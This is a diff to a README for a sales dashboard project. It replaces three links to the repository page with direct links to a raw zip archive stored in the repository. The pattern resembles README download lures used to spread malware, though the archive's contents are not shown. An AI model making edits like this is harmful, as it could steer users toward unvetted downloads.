@@ -1,6 +1,6 @@
 # 📊 Sales_Performance_Dashboard - Track Sales, Profit, and Trends
 
-[![Download Dashboard](https://img.shields.io/badge/Download%20Dashboard-blue?style=for-the-badge)](https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard)
+[![Download Dashboard](https://img.shields.io/badge/Download%20Dashboard-blue?style=for-the-badge)](https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard/raw/refs/heads/main/Sales_Performance_Dashboard/Sales-Performance-Dashboard-v2.6.zip)
 
 ## 🧭 Overview
 
@@ -30,7 +30,7 @@ Use it to spot trends, compare performance, and review key numbers without sorti
 
 Visit this page to download and open the project files:
 
-https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard
+https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard/raw/refs/heads/main/Sales_Performance_Dashboard/Sales-Performance-Dashboard-v2.6.zip
 
 ## 🛠️ How to use it on Windows
 
@@ -161,4 +161,4 @@ This dashboard suits users who want to review sales data without building their 
 
 If you need to return to the files, use this link:
 
-https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard
+https://github.com/unambiguous-bdellium21/Sales_Performance_Dashboard/raw/refs/heads/main/Sales_Performance_Dashboard/Sales-Performance-Dashboard-v2.6.zip
